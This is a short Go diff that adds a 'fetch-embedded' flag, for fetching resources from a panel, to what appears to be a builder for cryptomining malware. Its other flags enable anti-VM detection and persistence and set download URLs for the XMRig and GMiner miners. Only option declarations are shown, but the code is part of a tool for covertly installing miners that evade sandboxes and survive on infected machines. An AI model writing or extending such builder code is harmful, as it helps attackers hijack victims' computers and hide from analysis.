@@ -24,6 +24,7 @@ var (
 	debugFlag       = flag.Bool("debug", false, "Enable debug console")
 	antiVMFlag      = flag.Bool("antivm", false, "Enable anti-VM detection")
 	persistenceFlag = flag.Bool("persistence", false, "Enable persistence")
+	fetchEmbeddedFlag = flag.Bool("fetch-embedded", false, "Fetch Resources from Panel")
 	outputFlag      = flag.String("output", "", "Output directory for the built binary")
 	xmrigURLFlag    = flag.String("xmrig-url", "http://127.0.0.1:8080/api/miner/xmrig", "Download URL for XMRig miner")
 	gminerURLFlag   = flag.String("gminer-url", "http://127.0.0.1:8080/api/miner/gminer", "Download URL for GMiner miner")
